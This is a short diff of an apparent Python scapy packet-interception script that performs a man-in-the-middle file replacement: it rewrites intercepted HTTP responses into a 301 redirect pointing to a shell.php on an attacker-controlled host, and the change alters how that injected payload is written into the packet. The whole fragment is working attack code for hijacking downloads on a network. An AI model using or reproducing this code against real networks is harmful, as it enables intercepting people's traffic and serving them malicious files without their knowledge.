@@ -45,8 +45,9 @@ def process_packet(packet):
                 ack_list.remove(scapy_packet[scapy.TCP].seq)
                 print("[+] Replacing file..")
                 http_redirect = "HTTP/1.1 301 Moved Permanently\nLocation: http://10.222.111.228/evil_shit/shell.php\n\n"
-                modified_packet = set_load(scapy_packet, http_redirect)
-                packet.set_payload(bytes(modified_packet))
+                scapy_packet[scapy.Raw].load = str(http_redirect)
+                # modified_packet = set_load(scapy_packet, http_redirect)
+                # packet.set_payload(bytes(modified_packet))
 
     packet.accept()  # Forwards packets
     # packet.drop()  # Drops packets
